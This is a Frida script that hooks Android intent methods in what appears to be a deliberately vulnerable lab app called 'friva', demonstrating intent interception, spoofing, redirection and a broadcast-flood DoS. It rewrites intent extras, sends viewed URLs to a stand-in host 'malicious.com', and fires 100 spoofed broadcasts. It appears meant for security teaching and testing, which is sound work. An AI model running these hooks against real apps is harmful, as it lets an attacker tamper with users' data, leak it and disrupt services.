Java.perform(function () {
    // Utility function to log messages
    function log(message) {
        console.log("[Frida] " + message);
    }

    // Hook ContextWrapper.startActivity (used by shareButton and redirectButton)
    var ContextWrapper = Java.use("android.content.ContextWrapper");
    ContextWrapper.startActivity.overload("android.content.Intent").implementation = function (intent) {
        // BAD PRACTICE: Implicit intents (e.g., ACTION_SEND, ACTION_VIEW) can be intercepted
        // Vulnerability: Intent Interception
        var action = intent.getAction();
        var extras = intent.getExtras();
        var extraText = extras ? extras.getString("android.intent.extra.TEXT") : null;
        var data = intent.getDataString();
        
        if (action === "android.intent.action.SEND" && extraText) {
            log("Intercepted ACTION_SEND intent with sensitive data: " + extraText);
            // Simulate malicious interception by modifying data
            // Comment out in production to avoid actual harm
            intent.putExtra("android.intent.extra.TEXT", "Malicious: " + extraText);
            log("Modified ACTION_SEND data to demonstrate interception");
        } else if (action === "android.intent.action.VIEW" && data) {
            log("Intercepted ACTION_VIEW intent with URL: " + data);
            // Simulate redirection vulnerability
            // Comment out in production
            intent.setData(Java.use("android.net.Uri").parse("https://malicious.com?secret=" + encodeURIComponent(data)));
            log("Redirected ACTION_VIEW to malicious URL");
        }

        log("startActivity called with action: " + action);
        return this.startActivity(intent);
    };

    // Hook ContextWrapper.sendBroadcast (used by broadcastButton and dosButton)
    ContextWrapper.sendBroadcast.overload("android.content.Intent").implementation = function (intent) {
        var action = intent.getAction();
        var secret = intent.getStringExtra("secret");
        if (action === "com.example.friva.VULNERABLE_ACTION" && secret) {
            log("Intercepted broadcast with action: " + action + ", secret: " + secret);
            // Simulate intent spoofing by modifying the secret
            // Comment out in production
            intent.putExtra("secret", "Spoofed: " + secret);
            log("Modified broadcast secret to demonstrate spoofing");
        }
        this.sendBroadcast(intent);
    };

    // Hook BroadcastReceiver.onReceive (vulnerableReceiver in IV_Fragment)
    var BroadcastReceiver = Java.use("android.content.BroadcastReceiver");
    BroadcastReceiver.onReceive.implementation = function (context, intent) {
        var action = intent.getAction();
        var secret = intent.getStringExtra("secret");
        if (action === "com.example.friva.VULNERABLE_ACTION") {
            log("vulnerableReceiver received broadcast with secret: " + secret);
            // Simulate malicious data processing
            // BAD PRACTICE: No validation of intent source
            log("No validation performed, vulnerable to spoofing");
        }
        this.onReceive(context, intent);
    };

    // Hook Activity.startActivity for VulnerableActivity
    var Activity = Java.use("androidx.appcompat.app.AppCompatActivity");
    Activity.startActivity.overload("android.content.Intent").implementation = function (intent) {
        var component = intent.getComponent();
        if (component && component.getClassName() === "com.example.friva.ui.IntentVulnerability.VulnerableActivity") {
            var secret = intent.getStringExtra("secret");
            log("Starting VulnerableActivity with secret: " + secret);
            // Simulate unauthorized access
            // Comment out in production
            intent.putExtra("secret", "Malicious: " + secret);
            log("Modified VulnerableActivity secret to demonstrate unauthorized access");
        }
        this.startActivity(intent);
    };

    // Simulate DoS by sending multiple broadcasts
    function simulateDoS() {
        var Intent = Java.use("android.content.Intent");
        var context = Java.use("android.app.Activity").$new().getApplicationContext();
        for (var i = 0; i < 100; i++) {
            var intent = Intent.$new("com.example.friva.VULNERABLE_ACTION");
            intent.putExtra("secret", "DoS attempt " + i);
            context.sendBroadcast(intent);
            log("Sent DoS broadcast " + i);
        }
        log("DoS simulation completed: Sent 100 broadcasts");
    }

    // Run DoS simulation after a delay to ensure app is ready
    setTimeout(simulateDoS, 2000);

    log("Frida script loaded: Hooking intent-related methods");
});
